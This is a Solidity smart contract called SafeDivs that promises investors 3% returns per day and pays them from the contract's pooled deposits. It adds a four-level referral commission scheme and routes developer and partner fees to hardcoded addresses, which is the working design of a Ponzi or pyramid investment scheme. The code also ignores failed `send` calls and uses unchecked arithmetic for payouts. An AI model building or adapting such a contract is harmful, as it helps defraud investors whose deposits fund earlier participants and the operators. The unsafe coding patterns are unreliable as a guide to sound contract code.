pragma solidity ^0.4.24;

/***********************************************************
 * SafeDivs contract
 *  - GAIN 3% PER 24 HOURS (every 5900 blocks)
 * 
 *  http://www.safedivs.com
 ***********************************************************/

/***********************************************************
 * @title SafeMath v0.1.9
 * @dev Math operations with safety checks that throw on error
 * change notes:  original SafeMath library from OpenZeppelin modified by Inventor
 * - added sqrt
 * - added sq
 * - added pwr 
 * - changed asserts to requires with error log outputs
 * - removed div, its useless
 ***********************************************************/
 library SafeMath {
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) 
        internal 
        pure 
        returns (uint256 c) 
    {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        require(c / a == b, "SafeMath mul failed");
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold
        return c;
    }
    
    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256) 
    {
        require(b <= a, "SafeMath sub failed");
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256 c) 
    {
        c = a + b;
        require(c >= a, "SafeMath add failed");
        return c;
    }
    
    /**
     * @dev gives square root of given x.
     */
    function sqrt(uint256 x)
        internal
        pure
        returns (uint256 y) 
    {
        uint256 z = ((add(x,1)) / 2);
        y = x;
        while (z < y) 
        {
            y = z;
            z = ((add((x / z),z)) / 2);
        }
    }
    
    /**
     * @dev gives square. multiplies x by x
     */
    function sq(uint256 x)
        internal
        pure
        returns (uint256)
    {
        return (mul(x,x));
    }
    
    /**
     * @dev x to the power of y 
     */
    function pwr(uint256 x, uint256 y)
        internal 
        pure 
        returns (uint256)
    {
        if (x==0)
            return (0);
        else if (y==0)
            return (1);
        else 
        {
            uint256 z = x;
            for (uint256 i=1; i < y; i++)
                z = mul(z,x);
            return (z);
        }
    }
}

/***********************************************************
 * SDDatasets library
 ***********************************************************/
library SDDatasets {
    struct Player {
        address addr;   // player address
        uint256 invested;    //
        uint256 atBlock;    // 
        uint256 payEth;
        uint256 aff;    // affiliate vault
        uint256 laff;   // 上级用户
        uint256 aff1sum; //以下是邀请奖励，直接发到自己的账户
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
    }
}

contract SafeDivs {
    using SafeMath              for *;

    address public devAddr_ = address(0xe6CE2a354a0BF26B5b383015B7E61701F6adb39C);
    address public affiAddr_ = address(0x08F521636a2B117B554d04dc9E54fa4061161859);

    //合作伙伴
    address public partnerAddr_ = address(0x08962cDCe053e2cE92daE22F3dE7538F40dAEFC2);

    bool public activated_ = false;
    modifier isActivated() {
        require(activated_ == true, "its not active yet."); 
        _;
    }

    function activate() isAdmin() public {
        require(address(devAddr_) != address(0x0), "Must setup devAddr_.");
        require(address(partnerAddr_) != address(0x0), "Must setup partnerAddr_.");
        require(address(affiAddr_) != address(0x0), "Must setup affiAddr_.");

        require(activated_ == false, "Only once");
        activated_ = true ;
	}
	
    mapping(address => uint256)     private g_users ;
    function initUsers() private {
        g_users[msg.sender] = 9 ;
        
        uint256 pId = G_NowUserId;
        pIDxAddr_[msg.sender] = pId;
        player_[pId].addr = msg.sender;
    }
    modifier isAdmin() {
        uint256 role = g_users[msg.sender];
        require((role==9), "Must be admin.");
        _;
    }	
	
    uint256 public G_NowUserId = 1000; //当前用户编号
    uint256 public G_AllEth = 0;
    
    mapping (address => uint256) public pIDxAddr_;  
    mapping (uint256 => SDDatasets.Player) public player_; 
	
	function GetIdByAddr(address addr) public 
	    view returns(uint256)
	{
	    return pIDxAddr_[addr];
	}
	

	function GetPlayerById(uint256 uid) public 
	    view returns(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256)
	{
	    SDDatasets.Player player = player_[uid];
	    return
	    (
	        player.invested,
	        player.atBlock,
	        player.payEth,
	        player.aff,
	        player.laff,
	        player.aff1sum,
	        player.aff2sum,
	        player.aff3sum,
	        player.aff4sum
	    );
	}

    constructor() public {

        initUsers();
    }
	
	function register_(uint256 _affCode) private{
        G_NowUserId = G_NowUserId.add(1);
        
        address _addr = msg.sender;
        
        pIDxAddr_[_addr] = G_NowUserId;

        player_[G_NowUserId].addr = _addr;
        player_[G_NowUserId].laff = _affCode;
        
        uint256 _affID1 = _affCode;
        uint256 _affID2 = player_[_affID1].laff;
        uint256 _affID3 = player_[_affID2].laff;
        uint256 _affID4 = player_[_affID3].laff;
        
        player_[_affID1].aff1sum = player_[_affID1].aff1sum.add(1);
        player_[_affID2].aff2sum = player_[_affID2].aff2sum.add(1);
        player_[_affID3].aff3sum = player_[_affID3].aff3sum.add(1);
        player_[_affID4].aff4sum = player_[_affID4].aff4sum.add(1);
	}
	    
    function register(uint256 _affCode) public payable{
        
        require(msg.value == 0, "registration fee is 0 ether, please set the exact amount");
        require(_affCode != 0, "error aff code");
        require(player_[_affCode].addr != address(0x0), "error aff code");
        
        register_(_affCode);
    }	
    
    function invest() public payable {
        
		//get uid
		uint256 uid = pIDxAddr_[msg.sender];
		if (uid == 0) {
			register_(1000);
			uid = G_NowUserId;
		}
		
        // if sender (aka YOU) is invested more than 0 ether
        if (player_[uid].invested != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 3% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = player_[uid].invested * 3 / 100 * (block.number - player_[uid].atBlock) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);
            
            player_[uid].payEth += amount;
        }

        G_AllEth = G_AllEth.add(msg.value);
        
        // record block number and invested amount (msg.value) of this transaction
        player_[uid].atBlock = block.number;
        player_[uid].invested += msg.value;
        
        if (msg.value > 1000000000) {
            distributeRef(msg.value, player_[uid].laff);
            
            uint256 devFee = (msg.value.mul(2)).div(100);
            devAddr_.transfer(devFee);
            
            uint256 partnerFee = (msg.value.mul(2)).div(100);
            partnerAddr_.transfer(partnerFee);
        }        
    }
    
    // this function called every time anyone sends a transaction to this contract
    function () isActivated() external payable {
        invest();
    }    
	
    function distributeRef(uint256 _eth, uint256 _affID) private{
        
        uint256 _allaff = (_eth.mul(16)).div(100);
        
        //四级返佣
        uint256 _affID1 = _affID;
        uint256 _affID2 = player_[_affID1].laff;
        uint256 _affID3 = player_[_affID2].laff;
        uint256 _affID4 = player_[_affID3].laff;
        uint256 _aff = 0;

        if (_affID1 != 0) {   
            _aff = (_eth.mul(10)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID1].aff = _aff.add(player_[_affID1].aff);
            player_[_affID1].addr.transfer(_aff);
        }

        if (_affID2 != 0) {   
            _aff = (_eth.mul(3)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID2].aff = _aff.add(player_[_affID2].aff);
            player_[_affID2].addr.transfer(_aff);
        }

        if (_affID3 != 0) {   
            _aff = (_eth.mul(2)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID3].aff = _aff.add(player_[_affID3].aff);
            player_[_affID3].addr.transfer(_aff);
       }

        if (_affID4 != 0) {   
            _aff = (_eth.mul(1)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID4].aff = _aff.add(player_[_affID4].aff);
            player_[_affID4].addr.transfer(_aff);
            
        }

        if(_allaff > 0 ){
            affiAddr_.transfer(_allaff);
        }          
    }	
}